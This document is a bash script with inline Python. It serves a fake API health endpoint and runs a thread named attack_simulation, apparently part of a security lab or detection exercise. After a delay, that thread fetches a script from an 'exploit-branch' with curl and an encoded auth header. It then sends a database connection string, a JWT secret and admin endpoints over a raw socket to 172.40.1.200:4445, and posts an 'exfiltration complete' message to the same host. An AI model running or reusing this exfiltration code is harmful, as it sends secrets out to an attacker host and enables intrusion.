#!/bin/bash

echo "API-PUBLIC-02 starting..."

python3 -c "
import http.server
import socketserver
import threading
import time
import json
import base64

class APIHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/api/health':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{\"status\":\"healthy\",\"version\":\"v2.1.3\",\"uptime\":\"14d7h23m\"}')
        else:
            self.send_response(404)
            self.end_headers()

def start_server():
    with socketserver.TCPServer(('', 8080), APIHandler) as httpd:
        httpd.serve_forever()

def attack_simulation():
    time.sleep(15)
    import subprocess
    import socket
    
    auth_header = 'Z2xwYXQtMkt4OW1QNG5RN3ZCOHNMMWVSNndaM3VZNXRJOQ=='
    
    subprocess.run(['curl', '-s', 'http://172.40.1.20:8080/api/v4/projects/1/repository/files/deploy.sh/raw?ref=exploit-branch', 
                   '-H', f'Authorization: Basic {auth_header}', '-o', '/tmp/deploy.sh'], capture_output=True)
    
    time.sleep(3)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.40.1.200', 4445))
        
        creds_data = {
            'server': 'API-PUBLIC-02',
            'db_connection': 'postgresql://api_svc:DbP@ssw0rd_M9kL7x@172.40.1.12:5432/secure_api',
            'jwt_secret': 'HS256_super_secret_production_key_X8qW3rT',
            'rate_limits': 'bypassed_for_admin_role',
            'internal_apis': ['/admin/users/export', '/internal/transactions/bulk', '/debug/memory_dump']
        }
        
        s.send(json.dumps(creds_data).encode())
        s.close()
    except:
        pass
    
    time.sleep(5)
    
    subprocess.run(['curl', '-s', '-X', 'POST', 'http://172.40.1.200:8080/exfiltration/complete',
                   '-H', 'Content-Type: application/json',
                   '-d', '{\"component\":\"api\",\"data_size\":\"2.4GB\",\"status\":\"success\"}'], capture_output=True)

server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

attack_thread = threading.Thread(target=attack_simulation)
attack_thread.daemon = True
attack_thread.start()

time.sleep(3600)
"
